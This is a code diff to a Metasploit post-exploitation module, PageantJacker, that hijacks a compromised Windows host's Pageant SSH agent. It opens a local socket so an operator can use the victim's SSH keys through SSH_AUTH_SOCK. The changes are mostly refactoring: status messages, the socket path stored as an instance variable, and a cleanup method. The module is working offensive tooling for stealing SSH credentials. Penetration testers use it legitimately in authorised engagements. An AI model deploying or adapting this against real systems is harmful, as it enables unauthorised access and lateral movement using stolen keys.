@@ -31,23 +31,24 @@ class Metasploit3 < Msf::Post
 
     ## load incognito
     if(!session.pageantjacker)
+      print_status("Loading PageantJacker extension on #{session.sid} (#{session.session_host})")
       session.core.use("pageantjacker")
     end
 
     if(!session.pageantjacker)
-      print_error("Failed to load pageantjacker on #{session.sid} (#{session.session_host})")
+      print_error("Failed to load PageantJacker on #{session.sid} (#{session.session_host})")
       return false
     end
 
-    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
-    if ::File.exists?(sockpath)
-        print_error("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
+    @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+    if ::File.exists?(@sockpath)
+        print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
         return false
     end 
 
-    ::UNIXServer.open(sockpath) {|serv|
-      print_status("Launched listening socket on #{sockpath}.")
-      print_status("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
+    ::UNIXServer.open(@sockpath) {|serv|
+      print_status("Launched listening socket on #{@sockpath}.")
+      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
       print_status("Now use any tool normally (e.g. ssh-add)")
     
       loop { 
@@ -61,11 +62,12 @@ class Metasploit3 < Msf::Post
       }   
     }   
 
-    if ::File.exists?(sockpath)
-        print_status("Cleaning up; removing #{sockpath}")
-        ::File.delete(sockpath)
-    else
-        print_status("Unable to remove socket #{sockpath}")
+  end
+
+  def cleanup
+
+    if ::File.exists?(@sockpath)
+        ::File.delete(@sockpath)
     end
 
   end
